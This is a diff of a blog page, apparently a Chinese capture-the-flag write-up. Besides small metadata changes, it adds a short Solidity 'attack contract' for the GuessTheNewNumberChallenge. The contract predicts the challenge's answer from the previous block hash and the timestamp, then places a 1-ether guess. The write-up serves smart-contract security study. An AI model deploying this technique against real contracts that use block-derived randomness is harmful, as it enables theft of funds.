@@ -1794,7 +1794,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1690522141791),
+    lastupdate: new Date(1692682587051),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
       for_post: ["toc","blogger","qrcode"],
@@ -2995,7 +2995,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：238 字</p>
+      <p>字数：285 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
@@ -3062,7 +3062,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </li>
 <li></li>
 </ul>
-<h2 id="3-解题"><a href="#3-解题" class="headerlink" title="3. 解题"></a>3. 解题</h2>
+<h2 id="3-解题"><a href="#3-解题" class="headerlink" title="3. 解题"></a>3. 解题</h2><p><strong>攻击合约</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line"></span><br><span class="line">    GuessTheNewNumberChallenge challenge;</span><br><span class="line"></span><br><span class="line">    function Hack(address _challenge) public &#123;</span><br><span class="line">        challenge = GuessTheNewNumberChallenge(_challenge);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable  &#123;</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">        challenge.guess.value(1 ether)(answer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
   </div>
   
   
